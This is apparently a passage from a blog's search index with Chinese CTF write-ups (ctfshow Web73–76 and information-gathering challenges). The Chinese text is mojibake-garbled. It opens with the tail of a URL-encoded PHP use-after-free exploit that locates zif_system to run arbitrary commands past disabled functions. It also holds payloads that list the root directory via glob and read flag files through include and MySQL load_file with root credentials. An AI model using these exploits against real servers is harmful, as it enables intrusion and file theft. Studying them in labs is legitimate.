class="title">leak</span>(%24<span class="title">addr</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+7)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">leak</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x10102464c457f</span>)+%7<span class="title">b</span>+%23+<span class="title">ELF</span>+<span class="title">header</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+%24<span class="title">addr</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">addr</span>+%3<span class="title">d</span>+%24<span class="title">basic_funcs</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">do</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_entry</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">addr</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">f_name</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">f_entry</span>%2<span class="title">c</span>+0%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++++++++++<span class="title">if</span>(%24<span class="title">f_name</span>+%3<span class="title">d</span>%3<span class="title">d</span>+0<span class="title">x6d6574737973</span>)+%7<span class="title">b</span>+%23+<span class="title">system</span>%0<span class="title">a</span>++++++++++++++++<span class="title">return</span>+<span class="title">leak</span>(%24<span class="title">addr</span>+%2<span class="title">b</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%7<span class="title">d</span>%0<span class="title">a</span>++++++++++++%24<span class="title">addr</span>+%2<span class="title">b</span>%3<span class="title">d</span>+0<span class="title">x20</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++%7<span class="title">d</span>+<span class="title">while</span>(%24<span class="title">f_entry</span>+!%3<span class="title">d</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">return</span>+<span class="title">false</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">function</span>+<span class="title">trigger_uaf</span>(%24<span class="title">arg</span>)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++%23+<span class="title">str_shuffle</span>+<span class="title">prevents</span>+<span class="title">opcache</span>+<span class="title">string</span>+<span class="title">interning</span>%0<span class="title">a</span>++++++++%24<span class="title">arg</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Vuln</span>()%3<span class="title">b</span>%0<span class="title">a</span>++++++++%24<span class="title">vuln</span>-%3<span class="title">ea</span>+%3<span class="title">d</span>+%24<span class="title">arg</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">stristr</span>(<span class="title">PHP_OS</span>%2<span class="title">c</span>+%27<span class="title">WIN</span>%27))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%27<span class="title">This</span>+<span class="title">PoC</span>+<span class="title">is</span>+<span class="title">for</span>+*<span class="title">nix</span>+<span class="title">systems</span>+<span class="title">only</span>.%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">n_alloc</span>+%3<span class="title">d</span>+10%3<span class="title">b</span>+%23+<span class="title">increase</span>+<span class="title">this</span>+<span class="title">value</span>+<span class="title">if</span>+<span class="title">UAF</span>+<span class="title">fails</span>%0<span class="title">a</span>++++%24<span class="title">contiguous</span>+%3<span class="title">d</span>+%5<span class="title">b</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+%24<span class="title">n_alloc</span>%3<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">b</span>%2<span class="title">b</span>)%0<span class="title">a</span>++++++++%24<span class="title">contiguous</span>%5<span class="title">b</span>%5<span class="title">d</span>+%3<span class="title">d</span>+<span class="title">str_shuffle</span>(%27<span class="title">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">trigger_uaf</span>(%27<span class="title">x</span>%27)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc</span>+%3<span class="title">d</span>+%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>%5<span class="title">b0</span>%5<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>+%3<span class="title">d</span>+<span class="title">new</span>+<span class="title">Helper</span>%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">helper</span>-%3<span class="title">eb</span>+%3<span class="title">d</span>+<span class="title">function</span>+(%24<span class="title">x</span>)+%7<span class="title">b</span>+%7<span class="title">d</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+79+%7<span class="title">c</span>%7<span class="title">c</span>+<span class="title">strlen</span>(%24<span class="title">abc</span>)+%3<span class="title">d</span>%3<span class="title">d</span>+0)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">UAF</span>+<span class="title">failed</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">leaks</span>%0<span class="title">a</span>++++%24<span class="title">closure_handlers</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">php_heap</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x58</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++%24<span class="title">abc_addr</span>+%3<span class="title">d</span>+%24<span class="title">php_heap</span>+-+0<span class="title">xc8</span>%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">value</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x60</span>%2<span class="title">c</span>+2)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x70</span>%2<span class="title">c</span>+6)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">reference</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x10</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+0<span class="title">x60</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x18</span>%2<span class="title">c</span>+0<span class="title">xa</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">closure_obj</span>+%3<span class="title">d</span>+<span class="title">str2ptr</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>)%3<span class="title">b</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%24<span class="title">binary_leak</span>+%3<span class="title">d</span>+<span class="title">leak</span>(%24<span class="title">closure_handlers</span>%2<span class="title">c</span>+8)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">base</span>+%3<span class="title">d</span>+<span class="title">get_binary_base</span>(%24<span class="title">binary_leak</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">determine</span>+<span class="title">binary</span>+<span class="title">base</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">elf</span>+%3<span class="title">d</span>+<span class="title">parse_elf</span>(%24<span class="title">base</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">parse</span>+<span class="title">ELF</span>+<span class="title">header</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">basic_funcs</span>+%3<span class="title">d</span>+<span class="title">get_basic_funcs</span>(%24<span class="title">base</span>%2<span class="title">c</span>+%24<span class="title">elf</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">basic_functions</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++<span class="title">if</span>(!(%24<span class="title">zif_system</span>+%3<span class="title">d</span>+<span class="title">get_system</span>(%24<span class="title">basic_funcs</span>)))+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">die</span>(%22<span class="title">Couldn</span>%27<span class="title">t</span>+<span class="title">get</span>+<span class="title">zif_system</span>+<span class="title">address</span>%22)%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">fake</span>+<span class="title">closure</span>+<span class="title">object</span>%0<span class="title">a</span>++++%24<span class="title">fake_obj_offset</span>+%3<span class="title">d</span>+0<span class="title">xd0</span>%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">for</span>(%24<span class="title">i</span>+%3<span class="title">d</span>+0%3<span class="title">b</span>+%24<span class="title">i</span>+%3<span class="title">c</span>+0<span class="title">x110</span>%3<span class="title">b</span>+%24<span class="title">i</span>+%2<span class="title">b</span>%3<span class="title">d</span>+8)+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+%24<span class="title">fake_obj_offset</span>+%2<span class="title">b</span>+%24<span class="title">i</span>%2<span class="title">c</span>+<span class="title">leak</span>(%24<span class="title">closure_obj</span>%2<span class="title">c</span>+%24<span class="title">i</span>))%3<span class="title">b</span>%0<span class="title">a</span>++++%7<span class="title">d</span>%0<span class="title">a</span>%0<span class="title">a</span>++++%23+<span class="title">pwn</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">x20</span>%2<span class="title">c</span>+%24<span class="title">abc_addr</span>+%2<span class="title">b</span>+%24<span class="title">fake_obj_offset</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x38</span>%2<span class="title">c</span>+1%2<span class="title">c</span>+4)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">type</span>%0<span class="title">a</span>++++<span class="title">write</span>(%24<span class="title">abc</span>%2<span class="title">c</span>+0<span class="title">xd0</span>+%2<span class="title">b</span>+0<span class="title">x68</span>%2<span class="title">c</span>+%24<span class="title">zif_system</span>)%3<span class="title">b</span>+%23+<span class="title">internal</span>+<span class="title">func</span>+<span class="title">handler</span>%0<span class="title">a</span>%0<span class="title">a</span>++++(%24<span class="title">helper</span>-%3<span class="title">eb</span>)(%24<span class="title">cmd</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++<span class="title">exit</span>()%3<span class="title">b</span>%0<span class="title">a</span>%7<span class="title">d</span></span></span><br></pre></td></tr></table></figure><h1 id="web73"><a class="markdownIt-Anchor" href="#web73">#</a> Web73ï¼š</h1><p>â€‹åˆæ˜¯ï¼Œæ²¡æºç ï¼Œé‚£å°± glob éå†æ–‡ä»¶ç›®å½•å§ï¼Œå½“ç„¶ var_export ä¹Ÿå¯ä»¥åšåˆ°è¿™é‡Œæ²¡æœ‰è¢« banï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagc.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹çªç„¶å‘ç° include è¯»å–æ–‡ä»¶åˆå¯ä»¥äº†ï¼Œç›´æ¥è¯»ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="title function_ invoke__">indlude</span>(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web74"><a class="markdownIt-Anchor" href="#web74">#</a> Web74ï¼š</h1><p>â€‹è¿™ä¸€é¢˜ ban äº† scandirï¼Œé‚£å°±ç›´æ¥ glob ç»•è¿‡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flagx.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹å include å»è¯»ã€‚</p><h1 id="web75"><a class="markdownIt-Anchor" href="#web75">#</a> Web75ï¼š</h1><p>â€‹glob è¯»æ ¹ç›®å½•ç»“æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°æ— æ³•è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥è¯•ç€åˆ©ç”¨ mysql å»è¯»å–æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>â€‹ç®€å•è§£é‡Šä¸€ä¸‹è¿™ä¸ª payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨PDOï¼ˆPHP Data Objectsï¼‰åˆ›å»ºä¸€ä¸ªæ–°çš„æ•°æ®åº“è¿æ¥å¯¹è±¡ï¼ŒæŒ‡å®šDSNã€ç”¨æˆ·åï¼ˆrootï¼‰å’Œå¯†ç ï¼ˆrootï¼‰</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// æ‰§è¡Œä¸€ä¸ªSQLæŸ¥è¯¢ï¼Œä»æŒ‡å®šçš„æ–‡ä»¶ï¼ˆ/flag36.txtï¼‰ä¸­è¯»å–å†…å®¹</span></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">        <span class="comment">// è¾“å‡ºè¯»å–åˆ°çš„å†…å®¹ï¼Œå¹¶è¿½åŠ ä¸€ä¸ªç«–çº¿ï¼ˆ|ï¼‰</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å°†æ•°æ®åº“è¿æ¥å¯¹è±¡è®¾ç½®ä¸ºnullï¼Œå…³é—­è¿æ¥</span></span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœå‘ç”ŸPDOå¼‚å¸¸ï¼Œè¾“å‡ºé”™è¯¯ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    <span class="comment">// ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ</span></span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="web76"><a class="markdownIt-Anchor" href="#web76">#</a> Web76ï¼š</h1><p>â€‹è¿˜æ˜¯ glob è¯»æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag36d.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure><p>â€‹è¿˜æ˜¯è€æ ·å­ï¼ŒMySQL è¯»æ–‡ä»¶ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=information_schema&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36d.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;  </span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="ä¸€äº›æ€»ç»“æ–‡ç« "><a class="markdownIt-Anchor" href="#ä¸€äº›æ€»ç»“æ–‡ç« ">#</a> ä¸€äº›æ€»ç»“æ–‡ç« ï¼š</h1><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMzE1OTU3L2FydGljbGUvZGV0YWlscy8xMTg4NTU4NjU/b3BzX3JlcXVlc3RfbWlzYz0mYW1wO3JlcXVlc3RfaWQ9JmFtcDtiaXpfaWQ9MTAyJmFtcDt1dG1fdGVybT1saW51eCVFNSU4RiU5NiVFNSU4RiU4RCVFNSU5MSVCRCVFNCVCQiVBNHJjZSVFOCU4NCU5QSVFNiU5QyVBQyZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMn5hbGx+c29iYWlkdXdlYn5kZWZhdWx0LTEtMTE4ODU1ODY1LjE0MiU1RXYxMDAlNUVwY19zZWFyY2hfcmVzdWx0X2Jhc2U2JmFtcDtzcG09MTAxOC4yMjI2LjMwMDEuNDE4Nw==">æ€»ç»“ rceï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œå„ç§ sao å§¿åŠ¿ï¼‰ç»•è¿‡ bypass</span></p>]]></content>
      
      
      <categories>
          
          <category> Webç‹—çš„è‡ªæˆ‘å®‰æ…° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-ä¿¡æ¯æœé›†</title>
      <link href="/posts/97a7dff3.html"/>
      <url>/posts/97a7dff3.html</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a class="markdownIt-Anchor" href="#web1">#</a> Web1ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šå¼€å‘æ³¨é‡ŠæœªåŠæ—¶åˆ é™¤ ã€‚</p><p>â€‹æ‰“å¼€é¢˜ç›®åæç¤º web1:where is flag?</p><p>â€‹ctrl+u è¯»å–æºç ã€‚</p><h1 id="web2"><a class="markdownIt-Anchor" href="#web2">#</a> Web2ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šjs å‰å°æ‹¦æˆª === æ— æ•ˆæ“ä½œ</p><p>â€‹æ‰“å¼€é¢˜ç›®åæ˜¾ç¤ºï¼šæ— æ³•æŸ¥çœ‹æºä»£ç </p><p>â€‹å³é”®æ— æ³•ç”¨ï¼Œä½†æ˜¯ ctrl+u å¯ä»¥ç”¨ã€‚</p><h1 id="web3"><a class="markdownIt-Anchor" href="#web3">#</a> Web3ï¼š</h1><p>â€‹æç¤ºè¦æŠ“åŒ…ï¼Œé‚£å°±æŠ“åŒ…ï¼Œå‘é€åˆ° repeaterï¼Œå“åº”å¤´é‡Œå‘ç° flagã€‚</p><h1 id="web4"><a class="markdownIt-Anchor" href="#web4">#</a> Web4ï¼š</h1><p>â€‹é¢˜ç›®æè¿°ï¼šæ€»æœ‰äººæŠŠåå°åœ°å€å†™å…¥ robotsï¼Œå¸®é»‘é˜”å¤§ä½¬ä»¬å¼•è·¯ã€‚</p><p>â€‹åŸºç¡€çŸ¥è¯†ï¼šRobots åè®®ï¼ˆä¹Ÿç§°<span class="exturl" data-url="aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTclODglQUMlRTglOTklQUImYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw">çˆ¬è™«</span>åè®®ï¼Œæœºå™¨äººåè®®ç­‰ï¼‰çš„å…¨ç§°æ˜¯ â€œç½‘ç»œçˆ¬è™«æ’é™¤åè®®â€ï¼Œç½‘ç«™é€šè¿‡ Robots åè®®å‘Šè¯‰æœç´¢å¼•æ“å“ªäº›é¡µé¢å¯ä»¥æŠ“å–ï¼Œå“ªäº›é¡µé¢ä¸èƒ½æŠ“å–ã€‚</p><blockquote><p>Robots å‚æ•°ï¼š</p><p>User-agentï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°æœç´¢å¼•æ“èœ˜è››çš„åå­—ï¼›</p><p>æŠ€å·§ï¼š</p><p>1ï¼Œå½“ robots.txt ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œå¿…é¡»è‡³å°‘æœ‰ä¸€æ¡ user-agent çš„è®°å½•ï¼›</p><p>2ï¼Œç›¸åŒåå­—ï¼Œåªèƒ½æœ‰ä¸€æ¡ï¼Œä½†æ˜¯ä¸åŒçš„èœ˜è››ï¼Œå¯ä»¥æœ‰å¤šæ¡è®°å½•ï¼›</p><p>Disallowï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°ä¸å…è®¸æœç´¢å¼•æ“èœ˜è››çˆ¬è¡Œå’ŒæŠ“å–çš„ urlï¼›</p><p>ä½¿ç”¨æŠ€å·§ï¼š</p><p>åœ¨ robots.txt ä¸­è‡³å°‘è¦æœ‰ä¸€æ¡ disallowï¼›<br>Disallow è®°å½•ä¸ºç©ºï¼Œåˆ™è¡¨ç¤ºç½‘ç«™æ‰€æœ‰é¡µé¢éƒ½å…è®¸è¢«æŠ“å–ï¼›<br>ä½¿ç”¨ disallowï¼Œæ¯ä¸ªé¡µé¢å¿…é¡»å•ç‹¬åˆ†å¼€å£°æ˜ï¼›<br>æ³¨æ„ disallowï¼š/abc/ å’Œ disallowï¼š/abc çš„åŒºåˆ«ï¼›</p><p>Allowï¼š</p><p>ä½œç”¨ï¼šç”¨äºæè¿°æœç´¢å¼•æ“èœ˜è››çˆ¬è¡Œå’ŒæŠ“å–çš„ urlï¼›</p><p>ä½¿ç”¨æŠ€å·§ï¼šæœç´¢å¼•æ“é»˜è®¤æ‰€æœ‰çš„ url æ˜¯ Allowï¼›</p></blockquote><p>â€‹è®¿é—® robots.txt æ–‡ä»¶å‘ç°å¦‚ä¸‹ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 